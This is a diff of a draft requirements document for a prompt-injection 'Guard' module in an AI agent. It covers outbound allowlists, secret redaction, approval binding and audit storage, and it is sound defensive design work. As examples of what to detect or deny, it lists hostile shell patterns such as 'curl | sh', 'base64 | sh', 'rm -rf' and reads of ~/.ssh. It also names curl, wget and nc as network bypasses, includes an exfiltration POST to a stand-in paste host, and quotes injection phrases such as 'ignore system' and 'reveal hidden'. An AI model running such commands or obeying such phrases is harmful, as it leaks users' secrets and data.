@@ -2,178 +2,334 @@
 status: draft
 ---
 
-# Guard Module (Prompt Injection Defense) — Requirements
+# Guard Module — Minimal Requirements (M1)
 
 Date: 2026-02-01
 
 ## 1. Background
-Agents that (1) ingest untrusted content, (2) hold tool privileges, and (3) can access local/cloud resources are vulnerable to prompt injection, which can lead to:
-- Sensitive information leakage (API keys, private memory, config files, system/host data, internal docs, etc.).
-- Execution of dangerous operations (destructive commands, data exfiltration, privilege overreach, etc.).
 
-This calls for a dedicated Guard module that provides consistent risk control across input, reasoning, tools, skills, and output, with human approval for high-risk actions.
+Agents that ingest untrusted content while holding tool/network/file privileges are vulnerable to prompt injection and accidental data exfiltration.
 
-## 2. Goals and Non-Goals
+This Guard module is a **content-level and workflow-level safety layer**:
+- It does **not** replace OS/container sandboxing.
+- It focuses on high-value controls that the OS cannot reliably express (content redaction, outbound destination policy, human approval workflow, audit trail).
 
-### 2.1 Goals
-- Reduce the probability of sensitive data leakage and unsafe actions in prompt injection scenarios (secure-by-default).
-- Enforce a consistent “block / downgrade / require approval” policy for risky actions, with full traceability (audits, event IDs, decision reasons).
-- Provide a human-approval loop. MVP supports approvals via interactive TTY prompt and Telegram DM.
-- Keep policies configurable and extensible (additional approval channels and detectors later).
+## 2. Positioning: Prefer OS/Container for Capability Boundaries
 
-### 2.2 Non-Goals (for MVP)
-- Not aiming for perfect detection accuracy; prioritize explainable, configurable, auditable controls.
-- No model training/fine-tuning as part of MVP; start with rules/heuristics + pluggable detectors.
-- Not replacing the product’s authorization model; Guard is a safety gate, not a full permission system.
+Many “policies” are better implemented by the runtime environment:
 
-## 3. Threat Model (Scope)
+- **Privilege escalation**: prefer running as an unprivileged user with no sudo (e.g. systemd `User=` + `NoNewPrivileges=yes`).
+- **Filesystem scope**: prefer systemd/container allowlists (e.g. bind-mount a workspace read-only; restrict writable paths to state/cache dirs).
 
-### 3.1 Attack Surfaces
-- External content: web pages, PDFs, emails, chat logs, issue/PR comments, logs, user-pasted text, etc.
-- Tool outputs: shell output, file contents, HTTP responses, DB query results, etc.
-- Multi-turn context: malicious instructions hidden inside history or disguised as “system prompts”.
-- Skills: untrusted skill content and scripts, especially when installed from remote sources.
+The Guard module should **assume the process is already sandboxed**.
 
-### 3.2 Protected Assets (Examples)
-- Secrets: API keys, tokens, private keys, certificates, passwords, cookies/sessions, kubeconfig, SSH configs, etc.
-- Private memory: user profiles, internal notes, private vector-store chunks, system prompts, internal tool docs, etc.
-- Environment/system data: hostnames, internal IPs, process info, directory layouts, cloud account IDs, CI/CD variables, etc.
-- Business data: customer data, orders/finance, internal code, unpublished documents, etc.
+## 3. M1 Scope: Keep Only 3 High-Value Capabilities
 
-### 3.3 High-Risk Actions (Examples)
-- Destructive operations: `rm -rf`, formatting disks, dropping DBs, overwriting critical files.
-- Data exfiltration: sending file/log/config contents to external HTTP APIs, pasting into third-party services, uploading to unknown destinations.
-- Privilege escalation / lateral movement: reading credential directories, scanning internal networks, downloading and executing unknown binaries.
+M1 should ship with only:
 
-## 4. Functional Requirements
+1) **Outbound network allowlists (destination control)**  
+   Prevent exfiltration by restricting where outbound requests can go.
 
-### 4.1 Unified Interception Points (MUST)
-Guard must provide consistent interception (middleware/hook style) at the following points:
-- Tool call pre-hook (pre-call): inspect “what is about to be executed/sent/read”.
-- Tool call post-hook (post-call): inspect “what the tool returned” (secrets, over-privileged data).
-- Output pre-hook (pre-output): prevent leaking secrets in final responses or outbound messages.
-- Memory read/retrieval pre/post (SHOULD): prevent prompt injection from triggering private memory access and exfiltration.
-- Skill run pre-hook and post-hook (MUST): inspect the skill’s inputs/outputs and any tool calls the skill triggers.
-- Skill install gate (MUST):
-  - After download but before installing, scan the downloaded skill payload for potentially malicious behavior.
-  - If the scan flags risk, block or require approval before writing any content into the skills directory.
+2) **Sensitive data redaction (tool outputs + final output)**  
+   Prevent secrets/tokens/private keys from being stored, displayed, or forwarded.
 
-### 4.2 Risk Levels and Actions (MUST)
-Every guarded event must produce:
-- Risk level: `low / medium / high / critical` (configurable thresholds).
-- Action: `allow / allow_with_redaction / require_approval / deny`.
-- Explainable reasons: matched rules, detector signals, and the triggering source (which input/tool/skill).
+3) **Asynchronous approvals + audit trail**  
+   When policy requires approval, pause the run and return `pending` to the caller; store a durable approval request and resume only after approval.
 
-Default posture should be conservative: when uncertain, prefer `require_approval` or `deny` depending on context (fail closed for high-impact actions).
+Everything else (fine-grained command classification, complex per-method HTTP policies, perfect prompt-injection detection) is explicitly out of M1.
 
-### 4.3 Sensitive Data Detection and Redaction (MUST)
-- Detect sensitive patterns (rule-based first, with configurable regexes), e.g.:
-  - Common key/token formats (OpenAI/Stripe/GitHub/AWS), JWTs, private key blocks, kubeconfigs, `.env` variables.
-  - Path/file patterns: `~/.ssh/*`, `/etc/*`, `*.pem`, `*.key`, etc.
-- Redaction strategies:
-  - Output redaction: redact secrets before sending to the user (e.g., preserve only prefix/suffix).
-  - Tool-output redaction: filter tool output before it is stored, used for reasoning, or displayed.
-- Keep only a minimal “pre-redaction preview” for approvals and auditing, strictly limited in scope.
+## 4. Core Concepts
 
-### 4.4 Dangerous Operation Detection (MUST)
-At minimum cover shell, filesystem, and network:
-- Shell: destructive commands, dangerous flag combos, risky pipes/redirects (overwrite), hidden execution (`base64 | sh`), download-and-execute (`curl | sh`), etc.
-- Filesystem: reads of sensitive paths, recursive packing, bulk copies, credential directory access.
-- Network: sending content to non-allowlisted domains, uploading files, posting sensitive text to webhooks/short-link services.
+### 4.1 Actions
 
-When blocking/approving, provide: what triggered the rule, why it’s risky, and safer alternatives (e.g., “send a redacted snippet or a summary only”).
+Guard evaluates discrete “actions”:
 
-### 4.5 Approval Workflows (MUST)
-When a decision is `require_approval`:
-- Pause the action, create an `approval_request_id`, and inform the user that approval is required.
-- Support multiple approval channels (MVP):
-  1) **Interactive TTY approval** (when running in a TTY, e.g. `run --task`):
-     - Prompt in-terminal with a redacted action summary, risk reasons, and `Approve/Deny`.
-     - If no input within a timeout, default to `deny` (fail closed).
-  2) **Telegram DM approval** (admin-configured):
-     - Send an approval card to admin chat(s) with ID, time, session identifier (optionally anonymized), action type, redacted parameter summary, reasons, and the default recommendation.
-     - Provide **clickable buttons** (Inline Keyboard) for `Approve` / `Deny` (no typing required).
-- Apply the decision:
-  - `Approve`: continue the paused action (future enhancement: conditional approval like “only read first N lines / only send a summary”).
-  - `Deny`: abort the action with a clear reason and suggested safe alternative.
-- Timeout policy (MUST): e.g. deny after 5 minutes with reason `timeout`.
+- `ToolCallPre`: before executing a tool call
+- `ToolCallPost`: after a tool returns (inspection + redaction)
+- `OutputPublish`: before publishing a final answer / message
+- (Optional but recommended) `SkillInstall`: before writing downloaded skill files into a skills directory
 
-### 4.6 Configuration (MUST)
-Configurable via YAML/TOML/JSON and/or env vars:
-- Policy rules and thresholds: per tool/command/domain/path/regex for allow/deny/require_approval.
-- Approval channels:
-  - TTY prompt enable/disable, timeout.
-  - Telegram bot token, allowed admin chat IDs, message templates, button callbacks.
-- Allowlists: allowed directories, allowed domains, optionally allowed command sets.
-- Logging/retention: audit log sink, redaction level, retention days.
+### 4.2 Decisions
 
-### 4.7 Auditability and Observability (MUST)
-Structured audit logs per event:
-- `event_id`, timestamp, session/task identifiers, trigger source (input/tool output/user instruction/skill), action, risk level, outcome, matched rules, approval ID and result.
-- End-to-end traceability: planned action → guard decision → approval → executed/aborted.
+Every action yields:
 
-## 5. Design Notes (High-Level Architecture)
+- `risk_level`: `low | medium | high | critical`
+- `decision`: `allow | allow_with_redaction | require_approval | deny`
+- `reasons[]`: explainable matched rules
 
-### 5.1 Components
-- `Guard`: integrates with the agent lifecycle (input/tools/skills/output/memory) as the single enforcement point.
-- `PolicyEngine`: converts rules + context + detector signals into a decision (`allow/deny/approval`).
-- Pluggable `Detectors`:
-  - `SecretDetector`: keys/tokens/private key blocks, etc.
-  - `CommandRiskDetector`: dangerous shell operations and patterns.
-  - `DataExfilDetector`: outbound content/file exfiltration risks.
-  - `PromptInjectionHeuristics`: “ignore system”, “reveal hidden”, “exfiltrate memory” patterns (signal only).
-  - `SkillPackageScanner`: scans downloaded skill payloads (SKILL.md + scripts/assets) for suspicious behavior.
-- `Redactor`: redacts outputs and approval summaries.
-- `Approver`: approval state machine (create, wait, timeout, persist).
-- `Notifier`: approval notifications (MVP: Telegram notifier; extend later).
+Default posture: **fail closed for outbound and secret-like content** (deny or require approval).
 
-### 5.2 Decision Principles
-- Least privilege by default: do not read or exfiltrate anything unless explicitly authorized.
-- Fail closed for high-impact actions: uncertainty should not silently allow irreversible behavior.
-- Explainability: every block/approval must provide actionable reasons.
-- Layered defense: do not rely on “prompt rules” alone; enforce at tool/skill boundaries.
+## 5. Capability #1 — Outbound Network Allowlists
 
-## 6. Interface and Data Model Sketch
+### 5.1 Goal
 
-### 6.1 Guard Evaluation
-- `Guard.Evaluate(action, context) -> Decision`
-  - `action`: `ToolCall | SkillRun | SkillInstall | MemoryRead | OutputPublish | ...`
-  - `context`: session metadata, user-intent summary, source info (URL/file), previous risk events, etc.
-  - `Decision`: `allow | allow_with_redaction | require_approval | deny` + `risk_level` + `reasons[]`
+Block any outbound network request whose destination is not explicitly allowed.
 
-### 6.2 Approval Requests
-- `ApprovalRequest`:
-  - `id`, `created_at`, `expires_at`
-  - `action_summary_redacted`
-  - `risk_level`, `reasons`
-  - `status`: `pending/approved/denied/expired`
-  - `admin_actor`, `admin_comment` (optional)
+This applies to:
+- `url_fetch` (primary)
+- `web_search` (usually allow only its configured endpoint)
+- any tool that can send data to the network
 
-## 7. Telegram Approval (MVP) Details
-- Credentials must be provided via config/env (no hardcoding).
-- Admin authentication: only allow pre-configured `chat_id` values to approve/deny.
-- Message content must be redacted: do not send full file contents or full secrets—only the minimum necessary summary.
-- Inline keyboard buttons:
-  - `Approve` / `Deny` buttons with callback payload containing `approval_request_id` and action.
-  - After a decision, edit the message to reflect the final state (optional but recommended).
-- Concurrency and idempotency:
-  - Repeated approvals for the same `id` must be idempotent (define first-wins or last-wins explicitly).
-  - Expired requests must refuse execution and notify admin that the request is expired.
+If `bash` is enabled, this is especially important: `bash` can bypass `url_fetch` policies via `curl/wget/nc/...`. For M1, the safe default is:
+- either disable `bash`, or
+- require approval for any `bash`, or
+- deny known network binaries/tokens (e.g. `curl`, `wget`) in `bash` (best-effort; OS sandboxing is still preferred).
 
-## 8. MVP Acceptance Criteria
-- Guard can block and require approval for at least these scenarios:
-  1) outputting or reading suspected secrets/private keys;
-  2) executing dangerous shell commands (including variants like `rm -rf`, `curl | sh`);
-  3) sending sensitive content to a non-allowlisted external domain;
-  4) installing a downloaded skill that triggers the skill package scanner.
-- Approval loop is end-to-end:
-  - create request → notify (TTY and/or Telegram) → approve/deny → proceed/abort → timeout denies.
-- Auditing works:
-  - each interception emits an `event_id` with reasons and final outcome.
-- Secure defaults:
-  - detector failures or unknown states must not silently allow high-risk actions.
+### 5.2 Matching Model (simple by design)
 
-## 9. Milestones
-- M1 (Guard MVP): tool + skill interception, rule engine, TTY + Telegram approvals (buttons), audit logs, output redaction.
-- M2: conditional approvals (summary-only/partial file reads/allowlist expansions), more notification channels.
-- M3: policy management UI, regression corpus for prompt injection patterns, richer detectors and telemetry.
+Use one of:
+- `allowed_domains: ["api.example.com"]` (hostname only), or
+- `allowed_url_prefixes: ["https://api.example.com/v1/"]` (recommended; simplest to reason about)
+
+**M1 does not need method-based risk rules**. Method can be logged/audited, but is not required for policy.
+
+Recommended hardening defaults:
+- deny localhost / private IPs (no DNS resolution in M1, but deny literal IP + `localhost`)
+- disable proxies by default
+- allow redirects only if same-origin and still allowlisted (or disable redirects)
+
+Notes on the two “hardening” toggles:
+- `deny_private_ips`: reduces SSRF risk by blocking literal `localhost` / `127.0.0.1` / RFC1918 private IP targets. In M1 it does **not** resolve hostnames to IPs; if you need stronger protection, enforce egress at the OS/container/network layer.
+- `allow_proxy`: when false, the HTTP client should ignore `HTTP_PROXY` / `HTTPS_PROXY` / `NO_PROXY` env vars so requests cannot be transparently routed through a proxy/MITM.
+
+### 5.3 Example config sketch
+
+```yaml
+guard:
+  enabled: true
+  network:
+    # Prefer url_prefixes for clarity.
+    url_fetch:
+      allowed_url_prefixes:
+        - "https://api.jsonbill.com/tasks/"
+        - "https://duckduckgo.com/html/"
+      deny_private_ips: true
+      follow_redirects: false
+      allow_proxy: false
+```
+
+### 5.4 Example decisions
+
+- `url_fetch("https://api.jsonbill.com/tasks/123")` → allow
+- `url_fetch("https://paste.example/upload")` → deny (`non_allowlisted_domain`)
+- `url_fetch("http://127.0.0.1:8080/")` → deny (`private_ip`)
+
+## 6. Capability #2 — Sensitive Data Redaction
+
+### 6.1 Goal
+
+Redact secrets and secret-like material before it can:
+- enter the run context/history,
+- be shown to the user/admin,
+- be sent out via tools,
+- be emitted in logs/audit records.
+
+### 6.2 What to redact (M1)
+
+Rule-based detection with configurable regexes:
+- API keys/tokens (provider-specific patterns)
+- JWT-like strings
+- private key blocks (`-----BEGIN ... PRIVATE KEY-----`)
+- common `key=value` pairs with sensitive keys (`token=`, `api_key=`, `password=`)
+
+Redaction outputs should preserve only minimal structure (e.g. `sk-[redacted]`).
+
+### 6.3 Where to apply redaction (M1)
+
+- `ToolCallPost`: redact tool observations before appending to messages/context.
+- `OutputPublish`: redact final output before returning/sending.
+- Approval summaries: always redacted; never include full secret-bearing content.
+
+### 6.4 Example
+
+Tool output contains a JWT; the user sees:
+
+```text
+token=[redacted_jwt]
+```
+
+and the unredacted token never enters logs/context.
+
+## 7. Capability #3 — Async Approvals + Audit Trail
+
+### 7.1 Goal
+
+Support approvals without blocking the entire system:
+- The current run can be paused.
+- The caller receives a `pending` result containing `approval_request_id`.
+- The external controller (daemon/Telegram/embedded host) completes the approval flow and resumes the run.
+
+### 7.2 Approval binding (prevent “approve A, execute B”)
+
+Approvals must bind to a specific action snapshot:
+- Compute `action_hash = SHA256(canonical_json(action))`.
+- Store `approval_request_id -> {action_hash, created_at, expires_at, status, actor, reasons}`.
+- On resume, recompute `action_hash` and require it matches the stored value; otherwise deny.
+
+M1 note: approval expiry is currently **hard-coded** (5 minutes) to keep config surface small.
+
+### 7.3 API shape (conceptual)
+
+Guard integration should support:
+
+```go
+// Evaluate a candidate action.
+Decision := Guard.Evaluate(action, meta)
+
+// If Decision requires approval:
+reqID := Approvals.Create(actionHash, Decision, meta)
+return Pending{ApprovalRequestID: reqID}
+
+// Later: after an admin approves/denies:
+Approvals.Resolve(reqID, Approved|Denied, actor)
+Run.Resume(reqID) // resumes from the paused point
+```
+
+Implementation detail is up to the runtime:
+- CLI can “wait synchronously” by polling `Approvals.Resolve(...)` (TTY prompt), but it still uses the same async primitives.
+- Daemon/Telegram should return immediately with `pending`, then resume after approval, avoiding global blocking.
+
+### 7.4 What triggers approval (M1)
+
+Keep this small and high-signal:
+
+- Any action that sends data to a destination not in allowlist → **deny** (prefer deny over approval for exfil).
+- Any action that might reveal secrets to the user/admin (e.g. reading a private key file) → **require_approval** (or deny if OS sandboxing is expected to block it anyway).
+- Any `bash` action when `bash` is enabled and network binaries are not fully blocked → **require_approval** by default.
+
+### 7.5 Audit trail (M1)
+
+Every Guard decision produces an audit record:
+
+- `event_id`, `run_id`, timestamp
+- `action_type`, `tool_name` (if any)
+- redacted action summary (never store raw secrets)
+- decision/risk level/reasons
+- approval id + result (if applicable)
+
+## 8. Examples (End-to-end)
+
+### Example A — `url_fetch` blocked by allowlist
+
+Action:
+
+```json
+{"type":"ToolCallPre","tool":"url_fetch","params":{"url":"https://paste.example/upload","method":"POST"}}
+```
+
+Decision:
+- `risk_level: high`
+- `decision: deny`
+- reason: `non_allowlisted_domain`
+
+### Example B — Final output redaction
+
+Action:
+
+```json
+{"type":"OutputPublish","content":"Here is the token: sk-abcdef..."}
+```
+
+Decision:
+- `risk_level: high`
+- `decision: allow_with_redaction`
+- output becomes: `Here is the token: sk-[redacted]`
+
+### Example C — Async approval flow (embedded host)
+
+1) Run reaches a guarded action requiring approval → returns:
+
+```json
+{
+  "status": "pending",
+  "approval_request_id": "apr_123",
+  "message": "Approval required: reading a sensitive file."
+}
+```
+
+2) Host notifies admin (Telegram/UI). Admin approves `apr_123`.
+3) Host resumes the run; the engine continues from the paused step.
+
+## 9. Integration Notes for this Repo (non-normative)
+
+This repo already has pieces that can be reused:
+- `tools/builtin/confirm.go`: TTY confirmation primitive (useful for CLI “sync wait”).
+- `cmd/mister_morph/skills_install_builtin.go`: remote skill review + confirm flow; can be refactored to emit Guard audit events and to use the same approval binding.
+- `tools/builtin/url_fetch.go`: already enforces destination allow policies at the tool layer (auth profiles). Guard should complement this with “global outbound allowlists” and a consistent approval/audit story.
+
+## 10. M1 Acceptance Criteria
+
+- Outbound network requests are denied unless destination is allowlisted (prefix/domain).
+- Tool outputs and final outputs are redacted for secret-like material before being stored/logged/published.
+- Approval requests are durable, bound to a specific action hash, and can be resolved asynchronously.
+- Runs can pause/resume without blocking the whole daemon; `pending` is a first-class outcome for the controller.
+
+## 11. Audit Storage (M1)
+
+M1 should treat audit as a first-class output of Guard, but keep the storage mechanism flexible:
+
+- Guard produces **structured audit events** (in-memory structs).
+- An `AuditSink` persists them (or forwards them).
+- The default sink can be “structured logs”, but production deployments typically want a queryable store.
+
+### 11.1 What to store (minimal, safe)
+
+Audit records must be **redaction-safe** by construction:
+
+- Store only a **redacted action summary** (never raw secrets; never full file contents; never full HTTP bodies).
+- Store action binding fields (`action_hash`) so approvals cannot be replayed for a different action.
+
+Suggested fields:
+
+- `event_id`, `run_id`, timestamp
+- `action_type` (`ToolCallPre|ToolCallPost|OutputPublish|SkillInstall`)
+- `tool_name` (if any)
+- `action_summary_redacted`
+- `risk_level`, `decision`, `reasons[]`
+- `approval_request_id` (optional), `approval_status` (optional), `actor` (optional)
+- `action_hash` (SHA256 of canonical action)
+
+### 11.2 Where to store it
+
+M1 should use a single, clear storage approach:
+
+- **Audit events**: append-only **JSONL** under the service state directory (one JSON object per line).
+  - Rationale: high-throughput, low overhead, resilient to schema evolution.
+  - Retention (M1): rotate by size (e.g. 50–200MB per file) and/or by time (daily), and keep `N` days or a max total size cap.
+- **Approval state**: a small **SQLite** database under the same state directory (for durability across restarts).
+  - Store only: pending approvals, action_hash binding, decision/actor/expiry, and resume metadata.
+  - Do **not** store the full audit event stream in SQLite in M1.
+
+Future extensibility:
+- The JSONL stream can be shipped to external sinks (SIEM/IDS/DLP/log pipeline) via an agent (tail/forward), or replaced with a dedicated sink implementation later without changing Guard’s core logic.
+
+### 11.3 Retention and privacy
+
+M1 should include basic retention controls:
+- max age (e.g. 7–30 days) and/or max rows/bytes
+- rotation/retention for JSONL
+- periodic compaction for SQLite (approvals table) if needed
+
+Even with redaction, treat audit logs as sensitive:
+- do not store unredacted tool params or outputs
+- do not store “full previews” for approvals; keep previews minimal
+
+## 12. Implementation TODO (M1)
+
+- [x] Add `guard/` package: actions, decisions, redactor, network policy context helpers
+- [x] Add JSONL audit sink with size-based rotation
+- [x] Add SQLite approvals store (`guard_approvals`) for async approvals + resume metadata
+- [x] Wire Guard into the engine:
+  - [x] Tool pre-hook (`ToolCallPre`): enforce url_fetch destination allowlist, require approval for bash
+  - [x] Tool post-hook (`ToolCallPost`): redact observations before adding to context
+  - [x] Output hook (`OutputPublish`): redact final output before returning
+- [x] Enforce guard network policy in `url_fetch` redirects/proxy handling (when policy is present in context)
+- [x] Add viper config defaults + `config.example.yaml` examples for `guard.*`
+- [x] Add daemon HTTP admin endpoints to approve/deny/resume (`/approvals/{id}/*`)
+- [ ] Add Telegram approval commands to approve/deny/resume runs (M1 controller integration)
+- [ ] Persist daemon task metadata across restarts (current in-memory queue means resuming is only possible while the daemon is still running)
+- [ ] Add retention/rotation plumbing for JSONL (delete old files / max total size) and document recommended ops setup
+- [ ] Add more test coverage:
+  - [ ] approval flow (create → approve → `Engine.Resume`)
+  - [ ] url_fetch redirect bypass cases
+  - [ ] audit JSONL write/rotate behavior
